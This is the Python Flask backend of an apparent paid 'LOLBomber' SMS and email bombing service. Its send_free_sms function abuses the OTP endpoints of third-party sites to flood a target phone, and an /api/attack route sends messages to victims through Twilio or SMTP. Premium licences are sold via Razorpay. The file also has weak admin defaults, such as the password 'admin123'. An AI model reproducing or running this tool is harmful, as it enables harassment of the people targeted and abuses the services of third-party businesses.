import os
import hmac
import hashlib
import requests
import smtplib
import razorpay
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv

# Import database module functions (Mongo & Redis)
import database 

try:
    from twilio.rest import Client
    TWILIO_AVAILABLE = True
except ImportError:
    TWILIO_AVAILABLE = False

load_dotenv()

app = Flask(__name__)
# Enable CORS for all routes and allow custom headers for Admin Dashboard
CORS(app, resources={r"/*": {"origins": "*"}}, allow_headers=["Content-Type", "X-Admin-Password"])

SMTP_EMAIL = os.environ.get("SMTP_EMAIL", "")
SMTP_PASSWORD = os.environ.get("SMTP_PASSWORD", "")
TWILIO_SID = os.environ.get("TWILIO_ACCOUNT_SID", "")
TWILIO_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN", "")
TWILIO_PHONE = os.environ.get("TWILIO_PHONE_NUMBER", "")

# Admin Security
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")

# Razorpay Configuration
RAZORPAY_KEY_ID = os.environ.get("RAZORPAY_KEY_ID", "")
RAZORPAY_KEY_SECRET = os.environ.get("RAZORPAY_KEY_SECRET", "")

if RAZORPAY_KEY_ID and RAZORPAY_KEY_SECRET and "YOUR_TEST_KEY" not in RAZORPAY_KEY_ID:
    razorpay_client = razorpay.Client(auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET))
    DEMO_MODE = False
else:
    razorpay_client = None
    DEMO_MODE = True


def send_free_sms(target):
    # Free OTP Bomb logic...
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        requests.post("https://www.apollopharmacy.in/api/v1/auth/otp/send", json={"mobileNumber": str(target)}, headers=headers, timeout=2)
    except: pass
    try:
        requests.post("https://api.justdial.com/api/v2/login/getotp", json={"mobile": str(target)}, headers=headers, timeout=2)
    except: pass
    return True


def send_premium_sms(target, message):
    if not TWILIO_AVAILABLE or not TWILIO_SID or not TWILIO_TOKEN:
        return False, "Twilio missing keys"
    try:
        client = Client(TWILIO_SID, TWILIO_TOKEN)
        formatted_target = f"+91{target}" if len(target) == 10 else target
        client.messages.create(body=message, from_=TWILIO_PHONE, to=formatted_target)
        return True, "SMS sent successfully."
    except Exception as e:
        return False, str(e)


def send_email(target, message_body):
    if not SMTP_EMAIL or not SMTP_PASSWORD:
        return False, "SMTP credentials not configured"
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_EMAIL
        msg['To'] = target
        msg['Subject'] = "Message via LOLBomber"
        msg.attach(MIMEText(message_body, 'plain'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SMTP_EMAIL, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True, "Email sent successfully"
    except Exception as e:
        return False, str(e)


@app.route('/', methods=['GET'])
def index():
    return jsonify({"status": "LOLBomber Hybrid Backend Running!", "version": "3.0"})


@app.route('/api/create_order', methods=['POST'])
def create_order():
    if DEMO_MODE:
        # Return a dummy order for testing
        return jsonify({
            "success": True, 
            "order": {"id": "order_demo_" + str(os.urandom(4).hex()), "amount": 4900}, 
            "key_id": "rzp_test_demo_mode",
            "is_demo": True
        })

    if not razorpay_client:
        return jsonify({"success": False, "error": "Razorpay keys not configured in backend"}), 500
        
    try:
        # Create an Order for ₹49 (amount must be in paise i.e 4900)
        amount = 4900
        currency = "INR"
        order_receipt = 'lol_receipt_' + str(os.urandom(4).hex())
        
        ord_response = razorpay_client.order.create({
            "amount": amount,
            "currency": currency,
            "receipt": order_receipt,
            "payment_capture": "1" # Auto Capture
        })
        return jsonify({"success": True, "order": ord_response, "key_id": RAZORPAY_KEY_ID})
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/verify_payment', methods=['POST'])
def verify_payment():
    data = request.json
    razorpay_payment_id = data.get('razorpay_payment_id')
    razorpay_order_id = data.get('razorpay_order_id')
    razorpay_signature = data.get('razorpay_signature')
    
    if DEMO_MODE:
        # In demo mode, skip signature verification
        new_license_key = database.add_new_key(razorpay_order_id, razorpay_payment_id or "demo_pay_id")
        return jsonify({
            "success": True, 
            "premium_key": new_license_key, 
            "message": "DEMO MODE: Payment Verified! License Key Generated."
        })

    # 1. Verify Razorpay Signature securely
    val = f"{razorpay_order_id}|{razorpay_payment_id}"
    expected_signature = hmac.new(
        bytes(RAZORPAY_KEY_SECRET, 'utf-8'),
        msg=bytes(val, 'utf-8'),
        digestmod=hashlib.sha256
    ).hexdigest()
    
    if expected_signature != razorpay_signature:
        return jsonify({"success": False, "error": "Invalid signature"}), 400
        
    # 2. Payment successfully verified. Issue new License Key
    new_license_key = database.add_new_key(razorpay_order_id, razorpay_payment_id)
    
    return jsonify({
        "success": True, 
        "premium_key": new_license_key, 
        "message": "Payment Secured! License Key Generated."
    })


@app.route('/api/admin/stats', methods=['GET'])
def admin_stats():
    pwd = request.headers.get('X-Admin-Password')
    if pwd != ADMIN_PASSWORD:
        return jsonify({"success": False, "error": "Unauthorized Access Detected!"}), 401
    
    stats = database.get_admin_stats()
    return jsonify({"success": True, "stats": stats})

@app.route('/api/admin/analytics', methods=['GET'])
def admin_analytics():
    pwd = request.headers.get('X-Admin-Password')
    if pwd != ADMIN_PASSWORD:
        return jsonify({"success": False, "error": "Unauthorized!"}), 401
    
    data = database.get_analytics_data()
    return jsonify({"success": True, "data": data})

@app.route('/api/admin/keys', methods=['GET'])
def admin_list_keys():
    pwd = request.headers.get('X-Admin-Password')
    if pwd != ADMIN_PASSWORD:
        return jsonify({"success": False, "error": "Unauthorized!"}), 401
    
    keys = database.list_all_keys()
    return jsonify({"success": True, "keys": keys})

@app.route('/api/admin/keys/toggle', methods=['POST'])
def admin_toggle_key():
    pwd = request.headers.get('X-Admin-Password')
    if pwd != ADMIN_PASSWORD:
        return jsonify({"success": False, "error": "Unauthorized!"}), 401
    
    key_string = request.json.get('key_string')
    success = database.toggle_key_status(key_string)
    return jsonify({"success": success})

@app.route('/api/admin/keys/generate', methods=['POST'])
def admin_generate_key():
    pwd = request.headers.get('X-Admin-Password')
    if pwd != ADMIN_PASSWORD:
        return jsonify({"success": False, "error": "Unauthorized!"}), 401
    
    custom_key = request.json.get('custom_key')
    new_key = database.generate_admin_key(custom_key)
    if new_key:
        return jsonify({"success": True, "key": new_key})
    else:
        return jsonify({"success": False, "error": "Key already exists!"})


@app.route('/api/attack', methods=['POST'])
def handle_attack():
    data = request.json
    attack_type = data.get('type')
    target = data.get('target')
    mode = data.get('mode', 'free') 
    message = data.get('message', '')
    premium_key = data.get('premium_key', '')

    if not attack_type or not target:
        return jsonify({"success": False, "error": "Missing parameters"}), 400

    if attack_type == 'Email':
        success, info = send_email(target, message)
        return jsonify({"success": success, "error": info if not success else ""}), 200 if success else 500

    elif attack_type == 'SMS':
        if mode == 'premium':
            # --- AUTH CHECK ---
            if not database.is_key_valid(premium_key):
                return jsonify({"success": False, "error": "Invalid or Expired Premium License Key!"}), 401
                
            success, info = send_premium_sms(target, message)
            if success:
                database.log_attack(attack_type, target, mode) # LOG
            return jsonify({"success": success, "error": info if not success else ""}), 200 if success else 500
        else:
            # Free Mode
            # --- RATE LIMIT CHECK ---
            ip_address = request.remote_addr
            if database.is_rate_limited(ip_address):
                return jsonify({"success": False, "error": "Free Mode Rate Limit Exceeded (10/5mins). Upgrade to Premium!"}), 429
            
            success = send_free_sms(target)
            if success:
                database.log_attack(attack_type, target, mode) # LOG
            return jsonify({"success": True})
            
    return jsonify({"success": False, "error": "Unsupported type"}), 400

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5001, debug=True)
